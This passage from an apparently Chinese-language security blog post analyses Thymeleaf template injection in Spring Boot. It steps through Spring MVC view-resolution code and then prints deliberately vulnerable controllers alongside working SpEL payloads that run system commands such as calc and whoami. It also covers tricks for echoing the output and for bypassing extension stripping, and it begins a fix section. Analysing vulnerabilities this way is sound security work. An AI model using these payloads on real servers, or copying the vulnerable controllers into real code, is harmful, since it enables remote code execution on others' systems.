class="token comment">//执行handleReturnValue操作</span>           handler<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">,</span> returnType<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进<code>ViewNameMethodReturnValueHandler#handleReturnValue</code>：</p><ul><li>判断返回值类型是否为字符型，设置<code>mavContainer.viewName</code></li><li>判断返回值是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleReturnValue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> returnValue<span class="token punctuation">,</span> <span class="token class-name">MethodParameter</span> returnType<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span> <span class="token class-name">NativeWebRequest</span> webRequest<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token keyword">instanceof</span> <span class="token class-name">CharSequence</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">String</span> viewName <span class="token operator">=</span> returnValue<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//设置返回值为viewName</span>           mavContainer<span class="token punctuation">.</span><span class="token function">setViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//判断是否需要重定向</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isRedirectViewName</span><span class="token punctuation">(</span>viewName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               mavContainer<span class="token punctuation">.</span><span class="token function">setRedirectModelScenario</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token string">"Unexpected return type: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getParameterType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" in method: "</span> <span class="token operator">+</span> returnType<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面的操作，将返回值设置为<code>mavContainer.viewName</code></p><p>执行上述操作后返回到<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>中。通过<code>getModelAndView</code>获取<code>ModelAndView</code>对象</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185654740.png" alt="image-20240710185654740"></p><p><code>getModelAndView</code>根据<code>viewName</code>和<code>model</code>创建<code>ModelAndView</code>对象并返回</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710185924354.png" alt="image-20240710185924354"></p><br><p>接下来跟进到<code>applyDefaultViewName</code>方法</p><p>如果 ModelAndView 值不为null则什么也不做，否则如果<code>defaultViewName</code>存在值则会给 ModelAndView 赋值为 defaultViewName，也就是将 URI path 作为视图名称</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193340699.png" alt="image-20240710193340699"></p><hr><h3 id="获取视图"><a href="#获取视图" class="headerlink" title="获取视图"></a>获取视图</h3><p>接下来跟进到<code>processDispatchResult</code>，获取到<code>ModelAndView</code>值后会进入到<code>processDispatchResult</code>方法</p><p>第1个if会被跳过，跟进第2个if中的<code>render</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193725373.png" alt="image-20240710193725373"></p><p>在<code>render</code>方法中，首先会调用<code>getViewName</code>来获取mv对象的<code>viewName</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710193923360.png" alt="image-20240710193923360"></p><p>然后调用<code>resolveViewName</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710194219967.png" alt="image-20240710194219967"></p><p>循环遍历所有视图解析器解析视图，解析成功则返回，可以看到右下角这里有5个视图解析器</p><p>本以为会在<code>ThymeleafViewResolver</code>中获取视图，实际调试发现这里在<code>ContentNegotiatingViewResolver</code>中就已经获取到了视图</p><blockquote><p><code>ContentNegotiatingViewResolver</code>视图解析器允许使用同样的数据获取不同的View，支持三种方式：</p></blockquote><ol><li><p>使用扩展名：</p><p><a href="http://localhost:8080/employees/nego/Jack.xml">http://localhost:8080/employees/nego/Jack.xml</a><br>返回结果为XML<br><a href="http://localhost:8080/employees/nego/Jack.json">http://localhost:8080/employees/nego/Jack.json</a><br>返回结果为JSON<br><a href="http://localhost:8080/employees/nego/Jack">http://localhost:8080/employees/nego/Jack</a><br>使用默认view呈现，比如JSP</p></li><li><p>HTTP Request Header中的Accept：Accept 分别是<code>text/jsp</code>，<code>text/pdf</code>，<code>text/xml</code>，<code>text/json</code>和<code>无Accept请求头</code></p></li><li><p>使用参数：</p><p><a href="http://localhost:8080/employees/nego/Jack?format=xml">http://localhost:8080/employees/nego/Jack?format=xml</a><br>返回结果为XML<br><a href="http://localhost:8080/employees/nego/Jack?format=json">http://localhost:8080/employees/nego/Jack?format=json</a><br>返回结果为JSON</p></li></ol><p>接下来跟进到<code>ContentNegotiatingViewResolver#resolveViewName</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195200924.png" alt="image-20240710195200924"></p><p><code>getCandidateViews</code>循环调用所有的ViewResolver解析视图，解析成功放到视图列表中返回。同样也会根据Accept头得到后缀并通过ViewResolver解析视图</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195405092.png" alt="image-20240710195405092"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195451593.png" alt="image-20240710195451593"></p><br><p>接下来进入<code>getBestView</code>，根据Accept头获取最优的视图返回</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195808153.png" alt="image-20240710195808153"></p><p>最终返回的是<code>ThymeleafView</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200007899.png" alt="image-20240710200007899"></p><hr><h3 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h3><p>下一步是调用<code>render</code>方法</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200308152.png" alt="image-20240710200308152"></p><p>进入<code>ThymleafView#render</code>，接下来就是调用<code>renderFragment</code>**，这里就是漏洞触发的关键点之一了</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200453736.png" alt="image-20240710200453736"></p><p>该方法在后面首先判断<code>viewTemplateName</code>是否包含<code>::</code>，若包含则获取解析器</p><p>然后调用<code>parseExpression</code>方法将<code>viewTemplateName</code>（也就是Controller中最后return的值)构造成片段表达式<code>~&#123;&#125;</code>）并解析执行</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200843665.png" alt="image-20240710200843665"></p><p>因为我们这边的 viewTemplateName 为 user&#x2F;en&#x2F;welcome，所以不会进入<code>parseExpression</code></p><hr><h2 id="回显原理"><a href="#回显原理" class="headerlink" title="回显原理"></a>回显原理</h2><p>这种回显的本质其实是 <strong>throw 某个会包含表达式执行结果的异常</strong>，而在低版本的 springboot (&lt;&#x3D; 2.2) 中, <code>server.error.include-message</code> 的默认值为 <code>always</code>，这使得默认的 500 页面会显示异常信息</p><p>但是在高版本的 springboot (&gt;&#x3D; 2.3) 中, 上述选项的默认值变成了 <code>never</code>, 那么 500 页面就不会显示任何异常信息，所以这种回显形式还是会有一定的局限性</p><hr><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="templatename"><a href="#templatename" class="headerlink" title="templatename"></a>templatename</h2><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>打入payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token operator">?</span>lang<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PS：因为这里最后return的值为<code>user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x/welcome</code>，无论我们payload如何构造最后都会拼接<code>/welcome</code>，所以根据前面分析即使不加<code>.x</code>依然可以触发命令执行</p><p>然后继续前面的分析，这样就进入了<code>parseExpression</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710201426798.png" alt="image-20240710201426798"></p><p>在<code>StandardExpressionParser#parseExpression</code>中</p><p>通过<code>preprocess</code>进行预处理，预处理根据该正则<code>\\_\\_(.*?)\\_\\_</code>提取<code>__xx__</code>间的内容</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202246428.png" alt="image-20240710202246428"></p><p>获取<code>expression</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202506931.png" alt="image-20240710202506931"></p><p>可以看到这里返回的expression已经是一个SPEL表达式了</p><p>最终调用<code>execute</code>方法，执行表达式</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202537749.png" alt="image-20240710202537749"></p><p>于是就弹出计算器了，同时抛出错误</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202804970.png" alt="image-20240710202804970"></p><p>所以这个漏洞的本质是<strong>SPEL表达式执行</strong></p><hr><h2 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h2><p>对于<code>~&#123;templatename::selector&#125;</code>，因为前面是在templatename的位置注入表达式，那么我们同样也可以在selector处进行注入</p><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/fragment"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">fragment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> section<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"welcome :: "</span> <span class="token operator">+</span> section<span class="token punctuation">;</span> <span class="token comment">//fragment is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>fragment<span class="token operator">?</span>section<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其实这里也可以不需要<code>.x</code>和<code>::</code>也可触发命令执行</p><p>值得注意的是，templatename和selector这两个地方的注入点不同会导致有无回显的差别，即最后抛出异常，templatename是存在结果回显的而找不到selector不存在结果回显</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204032791.png" alt="image-20240710204032791"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204046819.png" alt="image-20240710204046819"></p><p>原因是最终抛出 <code>TemplateInputException</code> 异常的时候携带的是 template，也就是 <code>::</code> 前面的内容，并没有带出 selector，详情看下面的回显分析</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710205345656.png" alt="image-20240710205345656"></p><hr><h2 id="URI-path"><a href="#URI-path" class="headerlink" title="URI path"></a>URI path</h2><p>漏洞代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//returns void, so view name is taken from URI</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前面提过，在<code>applyDefaultViewName</code>方法处对当前ModelAndView做判断，如果为null则进入defalutViewName部分处理，将URI path作为mav的值即作为视图名称</p><p>所以我们直接在<code>&#123;document&#125;</code>位置传入payload，能直接弹计算器</p><p>但是当我们尝试执行 whoami 时，并没有产生回显，而是原封不动输出了我们的payload</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710211509566.png" alt="image-20240710211509566"></p><p>这是因为这个controller没有返回值，也不能有返回值，否则就不会调用<code>applyDefaultViewName</code>设置，如果我们的controller改成下面这样，将不会导致代码执行</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"welcome"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造回显"><a href="#构造回显" class="headerlink" title="构造回显"></a>构造回显</h3><p>templatename部分可控，没回显的原因在于defaultView中对URI path的处理，为了解决这个问题，我们可以在payload的最后加两个<code>.</code></p><p>payload：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>whoami<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是<code>::</code>必须放在后面，放在前面虽然可以执行命令，但是没有回显，类似于templatename和selector的区别</p><p>造成这个问题的地方在<code>StandardExpressionParser#parseExpression</code>，<strong>在<code>preprocess</code>预处理结束后</strong>还会再走<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显</p><p>现在来使用<code>::.x</code>结尾的payload：</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022303079.png" alt="image-20240711022303079"></p><p>可以看到这里<code>::</code>后面是没有内容的，因此解析后expression的值为null，所以最终会抛出<code>IllegalArgumentException</code>异常，携带的异常信息只包含了我们输入的内容, 并没有命令的回显</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711103449462.png" alt="image-20240711103449462"></p><br><p>而使用<code>::..</code>结尾的payload：</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022515345.png" alt="image-20240711022515345"></p><p>这一步是正常解析出了expression，值变成 FragmentExpression</p><p>之后返回到 <code>ThymeleafView#renderFragment</code> 方法, 往下会将表达式执行结果作为 templateName，并提取出 <code>::</code> 后面的内容作为 selector</p><p>然后调用 <code>viewTemplateEngine.process()</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711104350408.png" alt="image-20240711104350408"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105057414.png" alt="image-20240711105057414"></p><p>跟进 <code>TemplateManager#resolveTemplate</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105238882.png" alt="image-20240711105238882"></p><p>templateResolver 负责在 classpath (prefix) 下依据 template (name) 和 suffix 寻找对应的模板文件</p><p>这里肯定是找不到的, 所以会抛出 TemplateInputException 异常, 但是这个异常会带出 tempate 名称并最终显示在 500 页面中, 因此达到了回显的效果</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105820284.png" alt="image-20240711105820284"></p><hr><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>现在分析一下为什么<code>::.x</code>会被去掉：</p><p>在分析<code>URI PATH</code>这种方式能获取<code>ModelAndView</code>的原因时，我们分析过在<code>applyDefaultViewName</code>中获取URI Path作为<code>ModelAndView</code>的name，这个操作在<code>DefaultRequestToViewNameTranslator#getViewName</code>中完成</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024115948.png" alt="image-20240711024115948"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024130741.png" alt="image-20240711024130741"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024213451.png" alt="image-20240711024213451"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getViewName</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> lookupPath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>urlPathHelper<span class="token punctuation">.</span><span class="token function">getLookupPathForRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token class-name">HandlerMapping</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>prefix <span class="token operator">+</span> <span class="token function">transformPath</span><span class="token punctuation">(</span>lookupPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getLookupPathForRequest</code>仅仅获取了请求的地址并没有对后面的<code>.x</code>做处理，处理主要是在<code>transformPath</code>中完成的</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024400363.png" alt="image-20240711024400363"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Nullable</span><span class="token keyword">protected</span> <span class="token class-name">String</span> <span class="token function">transformPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> lookupPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> path <span class="token operator">=</span> lookupPath<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripLeadingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripTrailingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripExtension<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">stripFilenameExtension</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SLASH</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token constant">SLASH</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> path<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024501146.png" alt="image-20240711024501146"></p><p><code>stripFilenameExtension</code>会去除最后一个<code>.</code>后的内容，所以可以通过下面的方式绕过</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token function">assadasd</span><span class="token punctuation">.</span>asdas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>总之就是让<code>::</code>后面有内容才能实现回显</p><hr><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><h2 id="配置ResponseBody或RestController注解"><a href="#配置ResponseBody或RestController注解" class="headerlink" title="配置ResponseBody或RestController注解"></a>配置ResponseBody或RestController注解</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//returns void, so view name is taken from URI</span>    <span class="token punctuation">&#125;</span><span 